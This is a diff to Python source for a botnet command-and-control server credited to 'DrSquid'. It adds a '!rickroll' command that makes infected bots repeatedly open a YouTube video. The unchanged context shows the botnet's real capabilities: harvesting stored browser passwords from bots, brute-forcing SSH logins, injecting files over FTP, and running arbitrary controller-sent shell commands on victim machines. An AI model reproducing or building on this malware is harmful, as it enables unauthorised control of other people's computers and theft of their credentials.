@@ -256,6 +256,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("[+] !getcwd                      - Gets the bots working directory.")
         print("[+] !getos                       - Gets the OS Of the bots.")
         print("[+] !getpasswords                - Gets the stored browser passwords of the bots.")
+        print("[+] !rickroll                    - Rick Rolls the Bots.")
         print("\n[+] Commands for SSH Botnet:\n")
         print("[+] !infect [ip] [user]          - Brute forces login for the provided ip and username.")
         print("[+] !inject [file]               - Opens FTP and injects a file into an infected host.")
@@ -366,6 +367,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] !getcwd                      - Gets the bots working directory.
 [+] !getos                       - Gets the OS Of the bots.
 [+] !getpasswords                - Gets the stored browser passwords of the bots.
+[+] !rickroll                    - Rick Rolls the Bots.     
 
 [+] Commands for SSH Botnet:
 
@@ -766,6 +768,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] - Added Bot file editing.
 [+] - Added Bot file creation.
 [+] - Optimized the code a little.
+[+] - Added Rick Roll command.
                     """)
                 if self.instruction != "!clear":
                     self.send_ssh(self.instruction)
@@ -4547,6 +4550,14 @@ OS:       {sys.platform}
                         self.send(f"File {filename} has been created in {os.getcwd()}".encode())
                     except:
                         self.send("Error with creating files.".encode())
+                elif self.msg.startswith("!rickroll"):
+                    if sys.platform == "win32":
+                        for i in range(10):
+                            os.system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO")
+                    else:
+                        for i in range(10):
+                            os.system("open https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO")
+                    self.send("Just got rick rolled!".encode())
                 else:
                     output = os.popen(self.msg).read()
                     self.send(output)
